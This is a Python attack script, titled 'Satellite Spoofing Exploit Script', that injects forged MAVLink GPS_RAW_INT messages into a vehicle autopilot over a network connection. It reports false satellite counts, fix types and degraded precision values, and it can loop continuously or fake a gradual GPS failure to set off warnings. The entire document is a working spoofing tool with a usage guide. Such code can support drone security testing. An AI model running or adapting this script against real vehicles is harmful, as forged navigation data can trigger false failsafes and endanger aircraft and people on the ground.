#!/usr/bin/env python3
"""
Satellite Spoofing Exploit Script
Falsifies GPS satellite count to trigger false GPS quality warnings
"""

import sys
import time
from pymavlink import mavutil

def inject_gps_satellite_spoof(connection, satellite_count=None, fix_type=None,
                               lat=None, lon=None, alt=None, eph=None, epv=None,
                               vel=None, cog=None):
    """
    Inject spoofed GPS data with false satellite count
    
    Args:
        connection: MAVLink connection object
        satellite_count: Number of satellites (false value)
        fix_type: GPS fix type (0=no fix, 1=no GPS, 2=2D, 3=3D)
        lat: Latitude in degrees * 1e7
        lon: Longitude in degrees * 1e7
        alt: Altitude in mm
        eph: GPS HDOP in cm
        epv: GPS VDOP in cm
        vel: GPS ground speed in cm/s
        cog: Course over ground in centidegrees
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Default values - trigger low satellite warning
    if satellite_count is None:
        satellite_count = 3  # Low satellite count to trigger warning
    if fix_type is None:
        fix_type = 2 if satellite_count >= 4 else 1  # 2D fix if enough satellites
    if lat is None:
        lat = 0
    if lon is None:
        lon = 0
    if alt is None:
        alt = 0
    if eph is None:
        eph = 100  # High HDOP (poor quality)
    if epv is None:
        epv = 100  # High VDOP (poor quality)
    if vel is None:
        vel = 0
    if cog is None:
        cog = 0
    
    print(f"[*] Injecting GPS satellite spoof:")
    print(f"    Satellite Count: {satellite_count} (spoofed)")
    print(f"    Fix Type: {fix_type}")
    print(f"    HDOP: {eph} cm")
    print(f"    VDOP: {epv} cm")
    
    # Send GPS_RAW_INT message
    connection.mav.gps_raw_int_send(
        int(time.time() * 1000) % 4294967295,  # Time since boot in ms
        fix_type,      # GPS fix type
        lat,           # Latitude in degrees * 1e7
        lon,           # Longitude in degrees * 1e7
        alt,           # Altitude in mm
        eph,           # GPS HDOP in cm
        epv,           # GPS VDOP in cm
        vel,           # GPS ground speed in cm/s
        cog,           # Course over ground in centidegrees
        satellite_count  # Number of satellites visible
    )
    
    print("[+] GPS satellite spoof injected")

def trigger_low_satellite_warning(connection):
    """Trigger low satellite warning by reporting very few satellites"""
    print("[*] Triggering low satellite warning...")
    inject_gps_satellite_spoof(connection, satellite_count=2, fix_type=1)

def fake_gps_degradation(connection):
    """Fake GPS degradation by reporting decreasing satellite count"""
    print("[*] Faking GPS degradation...")
    for count in range(12, 2, -1):
        inject_gps_satellite_spoof(connection, satellite_count=count)
        time.sleep(1)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 satellite_spoofing.py <connection> [satellite_count] [action]")
        print("\nArguments:")
        print("  connection       MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  satellite_count  Number of satellites to report (default: 3)")
        print("  action           Action to perform:")
        print("                   low-warning    Trigger low satellite warning")
        print("                   degradation    Simulate GPS degradation")
        print("\nExamples:")
        print("  python3 satellite_spoofing.py udp:127.0.0.1:14550")
        print("  python3 satellite_spoofing.py udp:127.0.0.1:14550 2")
        print("  python3 satellite_spoofing.py udp:127.0.0.1:14550 0 low-warning")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    satellite_count = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else None
    action = sys.argv[3] if len(sys.argv) > 3 else None
    
    # If action is specified in second arg
    if satellite_count is None and len(sys.argv) > 2:
        if sys.argv[2] in ['low-warning', 'degradation']:
            action = sys.argv[2]
            satellite_count = None
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Perform action
    if action == 'low-warning':
        print("[*] Triggering low satellite warning (Press Ctrl+C to stop)...")
        try:
            while True:
                trigger_low_satellite_warning(connection)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping satellite spoofing...")
    elif action == 'degradation':
        fake_gps_degradation(connection)
    else:
        print("[*] Injecting satellite spoof (Press Ctrl+C to stop)...")
        try:
            while True:
                inject_gps_satellite_spoof(connection, satellite_count)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping satellite spoofing...")

if __name__ == "__main__":
    main()
